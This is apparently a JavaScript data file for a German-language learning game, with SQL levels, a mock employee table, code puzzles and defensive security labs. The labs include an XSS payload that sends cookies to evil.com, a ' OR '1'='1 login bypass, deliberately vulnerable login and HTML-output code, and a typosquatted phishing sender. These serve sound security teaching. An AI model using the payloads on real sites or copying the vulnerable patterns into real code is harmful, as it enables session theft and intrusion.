// Data for all interactive mini-games

export const SQL_DUNGEON_LEVELS = [
  {
    id: 1,
    title: 'Level 1: Die Aufklärung',
    description: 'Frage alle Daten aus der Tabelle "mitarbeiter" ab.',
    hint: 'Nutze den Befehl SELECT * FROM mitarbeiter;',
    initialQuery: 'SELECT * FROM ...',
    targetTable: 'mitarbeiter',
    validate: (resultRows) => resultRows && resultRows.length === 5,
    xpReward: 50
  },
  {
    id: 2,
    title: 'Level 2: Gutbezahlte Experten',
    description: 'Finde alle Mitarbeiter, die ein Gehalt von MEHR als 50000 verdienen.',
    hint: 'Nutze WHERE gehalt > 50000',
    initialQuery: 'SELECT * FROM mitarbeiter WHERE ...',
    targetTable: 'mitarbeiter',
    validate: (resultRows) => resultRows && resultRows.every(row => row.gehalt > 50000) && resultRows.length === 3,
    xpReward: 75
  },
  {
    id: 3,
    title: 'Level 3: Abteilungs-Zuordnung (JOIN)',
    description: 'Verknüpfe "mitarbeiter" und "abteilungen" über "abteilung_id" mit einem INNER JOIN.',
    hint: 'SELECT mitarbeiter.name, abteilungen.abteilungs_name FROM mitarbeiter INNER JOIN abteilungen ON mitarbeiter.abteilung_id = abteilungen.id',
    initialQuery: 'SELECT mitarbeiter.name, abteilungen.abteilungs_name FROM mitarbeiter INNER JOIN abteilungen ON ...',
    validate: (resultRows) => resultRows && resultRows.length >= 4 && resultRows[0].abteilungs_name,
    xpReward: 120
  },
  {
    id: 4,
    title: 'Level 4: Die teuerste Abteilung (GROUP BY)',
    description: 'Ermittle das durchschnittliche Gehalt (AVG(gehalt)) pro abteilung_id.',
    hint: 'SELECT abteilung_id, AVG(gehalt) AS avg_gehalt FROM mitarbeiter GROUP BY abteilung_id',
    initialQuery: 'SELECT abteilung_id, AVG(gehalt) FROM mitarbeiter ...',
    validate: (resultRows) => resultRows && resultRows.length >= 2,
    xpReward: 150
  }
];

export const MOCK_DATABASE_TABLES = {
  mitarbeiter: [
    { id: 1, name: 'Anna Schmidt', rolle: 'Developer', gehalt: 58000, abteilung_id: 101 },
    { id: 2, name: 'Bernd Müller', rolle: 'Sysadmin', gehalt: 48000, abteilung_id: 102 },
    { id: 3, name: 'Clara Weber', rolle: 'Security Specialist', gehalt: 67000, abteilung_id: 103 },
    { id: 4, name: 'David Fischer', rolle: 'Junior Dev', gehalt: 42000, abteilung_id: 101 },
    { id: 5, name: 'Elena Hoffmann', rolle: 'Data Analyst', gehalt: 61000, abteilung_id: 101 }
  ],
  abteilungen: [
    { id: 101, abteilungs_name: 'Software Entwicklung' },
    { id: 102, abteilungs_name: 'IT Operations' },
    { id: 103, abteilungs_name: 'Cyber Security' }
  ]
};

export const SECURITY_LAB_SCENARIOS = [
  {
    id: 'sqli_lab',
    title: '🚨 Lab #1: SQL Injection Abwehr',
    threat: 'Angreifer nutzt  \' OR \'1\'=\'1  um den Login zu umgehen.',
    codeVulnerable: `// UNSICHERER LOGIN-CODE
const query = "SELECT * FROM users WHERE user='" + username + "' AND pass='" + password + "'";
const user = db.query(query);`,
    options: [
      {
        id: 'opt1',
        label: 'String umwandeln mit toLowerCase()',
        isCorrect: false,
        feedback: 'Falsch! toLowerCase() verhindert keine SQL-Injections.'
      },
      {
        id: 'opt2',
        label: 'Prepared Statements / Parametrisierte Abfragen nutzen',
        isCorrect: true,
        codeFixed: `// SICHERER CODE
const query = "SELECT * FROM users WHERE user=? AND pass=?";
const user = db.query(query, [username, password]);`,
        feedback: 'Korrekt! Parametrisierte Abfragen trennen Benutzereingaben strikt vom SQL-Code.'
      },
      {
        id: 'opt3',
        label: 'Datenbankverbindung verstecken',
        isCorrect: false,
        feedback: 'Falsch! Security by Obscurity schützt nicht vor Injections.'
      }
    ]
  },
  {
    id: 'xss_lab',
    title: '☣️ Lab #2: Reflected XSS Neutralisierer',
    threat: 'Ein Angreifer gibt  <script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>  in das Suchfeld ein.',
    codeVulnerable: `// UNSICHERE HTML-AUSGABE
searchResultDiv.innerHTML = "Suchergebnisse für: " + userInput;`,
    options: [
      {
        id: 'opt1',
        label: 'Benutzereingabe vor der Ausgabe sanitizen / textContent verwenden',
        isCorrect: true,
        codeFixed: `// SICHERER CODE
searchResultDiv.textContent = "Suchergebnisse für: " + userInput;
// Oder HTML-Escaping: escapeHTML(userInput)`,
        feedback: 'Perfekt! textContent fügt Text als reinen String ein und führt keine Scripts aus.'
      },
      {
        id: 'opt2',
        label: 'Das Suchfeld deaktivieren',
        isCorrect: false,
        feedback: 'Keine gute Option für die Usability!'
      }
    ]
  },
  {
    id: 'phishing_lab',
    title: '🎣 Lab #3: Phishing Email Inspector',
    threat: 'Eine gefälschte E-Mail bittet um Passwort-Zurücksetzung.',
    emailHeader: `Von: support@paypa1-security-check.com
An: max.mustermann@firma.de
Betreff: Dringend! Ihr Konto wurde gesperrt. Klicken Sie hier um sich einzuloggen.`,
    options: [
      {
        id: 'opt1',
        label: 'Sofort auf den Link klicken und Anmeldedaten eingeben.',
        isCorrect: false,
        feedback: 'Achtung! Die Absender-Domain paypa1-security-check.com ist gefälscht (Typosquatting).'
      },
      {
        id: 'opt2',
        label: 'Die E-Mail als Phishing melden und Absender-Domain überprüfen.',
        isCorrect: true,
        feedback: 'Ausgezeichnet! Echte Unternehmen fordern dich niemals per E-Mail auf, sensible Daten auf fremden Links einzugeben.'
      }
    ]
  }
];

export const CODE_PUZZLE_LEVELS = [
  {
    id: 1,
    title: 'Sortiere den Algorithmus: Fakultät berechnen (Python/JS)',
    instructions: 'Bringe die Zeilen in die richtige Reihenfolge, um die Fakultät einer Zahl n zu berechnen.',
    lines: [
      { id: 'l1', text: 'function fakultaet(n) {' },
      { id: 'l2', text: '  if (n <= 1) return 1;' },
      { id: 'l3', text: '  return n * fakultaet(n - 1);' },
      { id: 'l4', text: '}' }
    ],
    correctOrder: ['l1', 'l2', 'l3', 'l4'],
    xpReward: 60
  },
  {
    id: 2,
    title: 'Fix the Bug: Array-Filterung in JS',
    instructions: 'Korrigiere den Fehler in dieser Funktion, die nur gerade Zahlen zurückgeben soll.',
    initialCode: `function getGeradeZahlen(arr) {
  // FEHLER: falsches Vergleichszeichen
  return arr.filter(num => num % 2 = 1);
}`,
    expectedOutput: '[2, 4, 6]',
    fixedCode: `function getGeradeZahlen(arr) {
  return arr.filter(num => num % 2 === 0);
}`,
    testInput: '[1, 2, 3, 4, 5, 6]',
    xpReward: 80
  }
];

export const LOGIC_GATES_LEVELS = [
  {
    id: 1,
    gateType: 'AND',
    description: 'Das AND-Gatter gibt nur 1 aus, wenn BEIDE Eingänge (A und B) den Wert 1 haben.',
    targetOutput: 1,
    xpReward: 40
  },
  {
    id: 2,
    gateType: 'XOR',
    description: 'Das XOR-Gatter (Exclusive OR) gibt 1 aus, wenn GENAU EINER der beiden Eingänge 1 ist.',
    targetOutput: 1,
    xpReward: 50
  }
];
